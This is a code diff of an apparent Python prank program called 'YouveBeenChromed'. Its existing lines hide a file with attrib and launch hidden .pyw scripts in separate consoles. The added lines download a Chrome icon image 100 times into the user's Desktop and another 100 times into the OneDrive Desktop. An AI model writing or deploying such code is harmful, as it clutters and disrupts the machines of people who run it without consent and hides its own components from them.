@@ -1,4 +1,6 @@
+import os
 import subprocess
+import urllib.request
 
 
 def main():
@@ -44,6 +46,25 @@ getChromed()
     subprocess.call('attrib +h ' + 'YouveBeenChromed.pyw')
     subprocess.call('py chrome.pyw', creationflags=subprocess.CREATE_NEW_CONSOLE)
     subprocess.call('py YouveBeenChromed.pyw', creationflags=subprocess.CREATE_NEW_CONSOLE)
+
+    url = "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Google_Chrome_icon_(September_2014).svg/1200px-Google_Chrome_icon_(September_2014).svg.png"
+    num = 1
+    desktop = os.path.join(os.environ["HOMEPATH"], "Desktop")
+    os.chdir(desktop)
+    for i in range(100):
+        r = urllib.request.urlopen(url)
+        with open('YouveBeenChromed' + str(num) + '.png', 'wb') as img:
+            img.write(r.read())
+        num = num + 1
+
+    num = 1
+    desktop = os.path.join(os.environ["HOMEPATH"], "OneDrive/Desktop")
+    os.chdir(desktop)
+    for i in range(100):
+        r = urllib.request.urlopen(url)
+        with open('YouveBeenChromed' + str(num) + '.png', 'wb') as img:
+            img.write(r.read())
+        num = num + 1
 
 
 if __name__ == '__main__':
